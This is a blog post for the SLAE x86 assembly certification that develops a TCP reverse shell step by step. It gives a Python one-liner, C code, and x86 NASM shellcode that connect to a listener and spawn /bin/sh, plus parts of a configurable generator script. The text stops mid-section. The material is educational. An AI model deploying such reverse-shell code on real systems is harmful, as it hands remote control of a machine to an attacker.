<!DOCTYPE html>
<html>
  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>SLAE x86 Exam - Assignment #2</title>
    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">

    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
    <link rel="canonical" href="/21/12/19/slae32-assignment-2">
    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />

    <style>
         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "â€¢"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
    </style>
</head>

  <body>
    <!--- Header and nav template site-wide -->
<header>
    <a href="/">RBCT</a>

    <nav class="group">
        
            
        
            
                
                <a href="/">POSTS</a>
                
            
        
            
                
                <a href="/about/">ABOUT</a>
                
            
        
    </nav>
</header>
    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
        <h1>SLAE x86 Exam - Assignment #2</h1>

        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
            <span class="mono authors">
                <a href="/author/rbct" itemprop="name">rbct</a>
            </span>
        </div>

        <time class="mono" datetime="2021-12-19T00:00:00+01:00" itemProp="datePublished">
            19 December 2021
        </time>

        <hr>
        <main itemprop="articleBody" style="position: relative;">
            <h2 id="disclaimer">Disclaimer</h2>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
<p>Student ID: PA-30398</p>
<h2 id="foreword">Foreword</h2>
<p>The 2nd assignment requires you to write shellcode for a <code>Reverse Shell TCP</code>.</p>
<p>There are two constraints: the <strong>IP address</strong> and the <strong>TCP port number</strong> should be <strong>easily configurable</strong>.</p>
<h2 id="source-code">Source Code</h2>
<p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2">rbctee/SlaeExam</a>.</p>
<p>List of files:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.c">tcp_rev_shell.c</a>: Reverse Shell written in <code>C</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.nasm">tcp_rev_shell.nasm</a>: Reverse Shell written in <code>Assembly</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/wrapper.py">automation/wrapper.py</a>: <code>python</code> script to automate the generation of shellcode based on arbitrary IP addresses and TCP port</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/template.nasm">automation/template.nasm</a>: generic template used by <code>wrapper.py</code></li>
</ul>
<h2 id="implementation">Implementation</h2>
<p>Follows the visual representation of this technique:</p>
<p><img src="/assets/img/slae32/reverse_shellcode_tcp_1.jpg" alt="Implementation of Reverse Shell TCP" />
<em>How a TCP Reverse Shell works</em></p>
<p>After creating a TCP socket, it connects to a specific TCP listener, identified by an <code>IP:PORT</code> pair. At that point, the program redirects input, output and error to the newly-created socket.</p>
<p>Finally, a shell is spawned, thus giving an interactive shell to the TCP listener the socket connected to.</p>
<p>The graph is based on the C code I wrote in the next chapter.</p>
<h3 id="c-code">C Code</h3>
<p>Given that I didn't know how to write a Reverse Shell in C, first I looked for a simple one-liner in <code>python</code> (which is the closest language I'm familiar with):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1", 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
</code></pre></div></div>
<p>Let's analyze the instructions:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">pty</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">))</span>

<span class="c1"># s.fileno() returns the File Descriptor associated with the socket
</span><span class="p">[</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)]</span>

<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
</code></pre></div></div>
<p>First, it creates a TCP <code>socket</code> and connects it to <code>127.0.0.1:4444</code>.</p>
<p>After that, it uses the function <code>dup2</code> in order to redirect <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> towards the socket.</p>
<p>Finally, it executes <code>/bin/sh</code>.</p>
<p>Let's see if my C version works:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;netinet/ip.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">client_socket_fd</span><span class="p">;</span>

    <span class="c1">// define an array made up of 1 value: 0</span>
    <span class="c1">// this way I don't have to pass NULL pointers to execve</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">empty</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">client_address</span><span class="p">;</span>

    <span class="c1">// create a TCP socket</span>
    <span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>

    <span class="c1">// connect to 127.0.0.1:4444</span>
    <span class="c1">// where netcat is listening</span>
    <span class="c1">// /bin/sh -c "nc -v -l 4444"</span>
    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>

    <span class="c1">// convert the IP address to an 'in_addr' struct</span>
    <span class="n">inet_aton</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">client_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>

    <span class="c1">// connect to the socket</span>
    <span class="n">connect</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_address</span><span class="p">));</span>

    <span class="c1">// redirect stdin/stdout/stderr to the socket</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="c1">// now that the standard file descriptors are redirected</span>
    <span class="c1">// once we spawn /bin/sh, input/output/error are going to be bound</span>
    <span class="c1">//      to the socket</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">empty</span><span class="p">,</span> <span class="n">empty</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The first part is similar to the previous assignment: it creates a TCP socket using the same arguments.</p>
<p>However, compared to the function <code>bind()</code>, <code>connect()</code> doesn't use the value <code>INADDR_ANY</code>. Instead, it uses a specific IP address to connect to.</p>
<p>I discovered that you can't just do the following:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span><span class="p">;</span>
</code></pre></div></div>
<p>The reason resides in the definition of the <a href="https://man7.org/linux/man-pages/man7/ip.7.html">sockaddr_in</a>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="p">{</span>
    <span class="n">sa_family_t</span>    <span class="n">sin_family</span><span class="p">;</span> <span class="cm">/* address family: AF_INET */</span>
    <span class="n">in_port_t</span>      <span class="n">sin_port</span><span class="p">;</span>   <span class="cm">/* port in network byte order */</span>
    <span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span>   <span class="cm">/* internet address */</span>
<span class="p">};</span>

<span class="cm">/* Internet address */</span>
<span class="k">struct</span> <span class="nc">in_addr</span> <span class="p">{</span>
    <span class="kt">uint32_t</span>       <span class="n">s_addr</span><span class="p">;</span>     <span class="cm">/* address in network byte order */</span>
<span class="p">};</span>
</code></pre></div></div>
<p>The variable <code>sin_addr</code> isn't simply a string (or a <code>char</code> array): it's an <code>in_addr</code> struct, so we need to convert the string first.</p>
<p>According to <a href="https://web.archive.org/web/20201128162706/https://www.gta.ufrj.br/ensino/eel878/sockets/inet_ntoaman.html">this website</a>, there are two options:</p>
<ul>
<li><code>inet_addr</code>, an old function and theorically deprecated</li>
<li><code>inet_aton</code>, which is the recommended way</li>
</ul>
<p>After that:</p>
<ul>
<li>the function <code>connect()</code> is used for connecting the newly-created socket to <code>127.0.0.1:4444</code> (a netcat listener running on the same machine)</li>
<li>input/output/error is redirected to the socket through the use of the <code>dup2</code> function.</li>
</ul>
<p>Lastly, the syscall <code>execve</code> spawns an <code>SH</code> shell.</p>
<p>Here's what's different from my first attempt at the <code>Bind Shell TCP Shellcode</code>: it seems you don't need to manage the reception of commands and their execution, like I did previously (in the first assignment) using the functions <code>recv</code>, and <code>system</code>.</p>
<p>In fact, after you correctly redirect input/output/error to the remote socket, and spawn a shell, everything else is performed automatically by the system.</p>
<h3 id="assembly">Assembly</h3>
<p>Follows the first piece of code we need to convert into Assembly code:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">client_socket_fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">empty</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">client_address</span><span class="p">;</span>

    <span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
</code></pre></div></div>
<p>As for the 1st assignment, a socket can be created by means of the <code>socketcall</code> system function:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Author: Robert Catalin Raducioiu (rbct)</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; clear EAX, EBX, and ECX registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>

    <span class="c1">; copy 102 into EAX: socketcall() syscall</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; 3rd argument of socket(): IPPROTO_TCP (0x6)</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">6</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; 1st argument of socketcall(): SYS_SOCKET</span>
    <span class="c1">; 2nd argument of socket(): SOCK_STREAM (0x00000001)</span>
    <span class="nf">inc</span> <span class="nb">bl</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 1st argument of socket(): AF_INET</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">2</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; 2nd argument of socketcall(): pointer to the arguments for SYS_SOCKET call</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; call syscall</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; save server socket file descriptor</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
</code></pre></div></div>
<p>As you can see, the syscall <code>socketcall</code> (n. 102, or <code>0x66</code>) calls <code>socket()</code>, to which the parameters <code>AF_INET</code>, <code>SOCK_STREAM</code>, <code>IPPROTO_TCP</code> are passed in order to create a TCP socket.</p>
<p>Once the socket has been created, we need to connect it to the remote server, in this case the netcat listener:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">inet_aton</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">client_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>

    <span class="n">connect</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_address</span><span class="p">));</span>
</code></pre></div></div>
<p>First <em>hurdle</em> is the <code>sockaddr_in</code> struct, which I've already covered in the 1st assignment:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">short</span>      <span class="n">sin_family</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">short</span>      <span class="n">sin_port</span><span class="p">;</span>
  <span class="k">struct</span> <span class="nc">in_addr</span>      <span class="n">sin_addr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">sin_addr</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">s_addr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The size of the struct <code>sockaddr_in</code> is <code>0x10</code> bytes (due to padding).</p>
<p>Follows the assembly code regarding the creation of the aforementioned struct, and the <code>connect</code> function:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; inet_aton("127.0.0.1")</span>
    <span class="c1">;rol ebx, 24</span>
    <span class="c1">;push ebx</span>
    <span class="nf">push</span> <span class="mh">0x0100007f</span>
    <span class="c1">;mov [esp], BYTE 127</span>
    
    <span class="c1">; 0x115c -&gt; htons(4444)</span>
    <span class="nf">push</span> <span class="kt">WORD</span> <span class="mh">0x5c11</span>

    <span class="c1">; 0x0002 -&gt; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">2</span>
    <span class="nf">push</span> <span class="kt">WORD</span> <span class="nb">bx</span>

    <span class="c1">; save the pointer to the struct for later</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    
    <span class="c1">; 3rd argument of connect(): size of the struct</span>
    <span class="c1">; push 16</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">16</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 2nd argument of connect(): pointer to the struct</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; 1st argument of connect(): file descriptor of the server socket</span>
    <span class="nf">push</span> <span class="nb">esi</span>
    
    <span class="c1">; syscall socketcall()</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; 1st argument of socketcall(): call SYS_CONNECT</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">3</span>

    <span class="c1">; 2nd argument of socketcall(): pointer to the parameters of bind()</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>Next, we're ready to redirect <code>stdin</code>/<code>stdout</code>/<code>stderr</code> towards the server socket.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; loop counter (repeats dup2() three times)</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>

<span class="nl">RepeatDuplicate:</span>
    <span class="c1">; save ecx since it's modified later</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; dup2() syscall</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">63</span>

    <span class="c1">; Client file descriptor</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>

    <span class="c1">; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>

    <span class="c1">; call dup2()</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; restore ecx and check if loop is over</span>
    <span class="nf">pop</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">RepeatDuplicate</span>
</code></pre></div></div>
<p>As for the previous assignment, the <code>loop</code> instruction repeats the routine <code>RepeatDuplicate</code> three times, once for <code>stderr</code> (<code>0x2</code>), <code>stdout</code> (<code>0x1</code>), and for <code>stdin</code> (<code>0x0</code>):</p>
<p>Finally, it spawns a shell:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">push</span> <span class="nb">ecx</span>
    <span class="nf">push</span> <span class="mh">0x68732f6e</span>
    <span class="nf">push</span> <span class="mh">0x69622f2f</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; execve syscall</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>From now, every message that will be sent from the netcat listener is going to be interpreted as a command, since the file descriptors of the <code>shell</code> are redirected to those of the <code>socket</code>.</p>
<h2 id="automation">Automation</h2>
<p>One of the requirements of the assignment is to be able to easily configure <code>IP address</code> and <code>TCP port</code>. For this reason, I chose to reuse the script I wrote for the first assignment, to which I've made some small changes in order to use arbitrary IP addresses too.</p>
<p>I won't show the whole script again, as I've already done that. I'll only cover the changes.</p>
<p>First, there's the <code>main</code> function. I've added another argument to the script, named <code>ip</code>:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'TCP Port for the Bind Shell'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">"[1-65535]"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-ip'</span><span class="p">,</span> <span class="s">"--ip"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"IP address of the Bind Shell"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--template'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Path of the NASM template file. Example: -t /tmp/template.nasm'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-o'</span><span class="p">,</span> <span class="s">'--output'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Path for the output file. Example: -o /tmp/output.nasm'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">ip</span>
    <span class="n">tcp_port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span>

    <span class="k">if</span> <span class="n">tcp_port</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65536</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Argument '--port' must be in range [1-65535]"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">shellcode_template</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">template</span>
    <span class="n">output_file_path</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">output</span>

    <span class="n">replace_template_values</span><span class="p">(</span><span class="n">shellcode_template</span><span class="p">,</span> <span class="n">tcp_port</span><span class="p">,</span> <span class="n">ip_address</span><span class="p">,</span> <span class="n">output_file_path</span><span class="p">)</span>
    <span class="n">generate_shellcode</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">)</span>
</code></pre></div></div>
<p>Other than that, I have changed the function <code>replace_template_values()</code>:</p>
